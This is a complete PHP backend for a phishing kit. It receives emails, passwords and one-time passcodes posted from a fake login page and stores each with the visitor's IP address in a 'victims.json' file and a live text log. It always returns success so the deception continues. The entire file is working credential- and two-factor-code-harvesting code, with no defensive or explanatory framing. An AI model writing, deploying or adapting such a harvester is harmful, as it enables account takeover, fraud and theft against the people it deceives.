<?php
session_start();
header('Content-Type: application/json');

$capture_file = __DIR__ . '/capturer/victims.json';
if (!is_dir(__DIR__ . '/capturer')) mkdir(__DIR__ . '/capturer', 0777, true);

function logCapture($type, $data) {
    global $capture_file;
    $records = file_exists($capture_file) ? json_decode(file_get_contents($capture_file), true) ?? [] : [];
    $records[] = array_merge([
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'type' => $type,
    ], $data);
    file_put_contents($capture_file, json_encode($records, JSON_PRETTY_PRINT));
    
    // Also save to a readable text file for mobile
    $txt = "[" . date('Y-m-d H:i:s') . "] $type: " . json_encode($data) . "\n";
    file_put_contents(__DIR__ . '/capturer/live_log.txt', $txt, FILE_APPEND);
}

$action = $_POST['action'] ?? '';

switch($action) {
    case 'login':
        $_SESSION['email'] = $_POST['email'] ?? '';
        logCapture('credentials', [
            'email' => $_POST['email'] ?? '',
            'password' => $_POST['password'] ?? '',
        ]);
        echo json_encode(['success' => true]);
        break;
    case 'otp':
        $otp = implode('', $_POST['otp'] ?? []);
        logCapture('otp', [
            'email' => $_SESSION['email'] ?? 'Unknown',
            'otp' => $otp,
        ]);
        echo json_encode(['success' => true]);
        break;
    default:
        echo json_encode(['success' => false]);
}
?>
